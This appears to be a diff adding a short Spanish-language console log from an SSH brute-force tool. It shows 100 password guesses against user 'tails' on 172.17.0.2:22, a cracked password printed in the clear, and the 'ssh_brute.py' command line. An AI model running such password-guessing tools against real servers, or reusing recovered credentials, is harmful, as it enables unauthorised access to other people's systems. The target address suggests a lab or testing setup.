@@ -1,0 +1,8 @@
+[*] 16 hilos, transporte SSH reutilizado
+[*] 0 intentos  (0/s)  pos=16/100[*] 16 intentos  (4/s)  pos=32/100[*] 16 intentos  (3/s)  pos=32/100[*] 32 intentos  (4/s)  pos=48/100[*] 32 intentos  (3/s)  pos=48/100[*] 48 intentos  (4/s)  pos=64/100[*] 59 intentos  (4/s)  pos=75/100[*] 64 intentos  (4/s)  pos=80/100[*] 81 intentos  (4/s)  pos=91/100[*] 91 intentos  (5/s)  pos=91/100
+[*] Objetivo 172.17.0.2:22
+[*] 1 usuario(s) x 100 contrasena(s) = 100 combinaciones
+
+[+] CREDENCIAL ENCONTRADA: tails / 3117548331
+[*] 91 intentos en 20.1s (5/s)
+python3 tools/ssh_brute.py -H 172.17.0.2 -u tails -P  -t 16  0.82s user 0.48s system 6% cpu 20.280 total
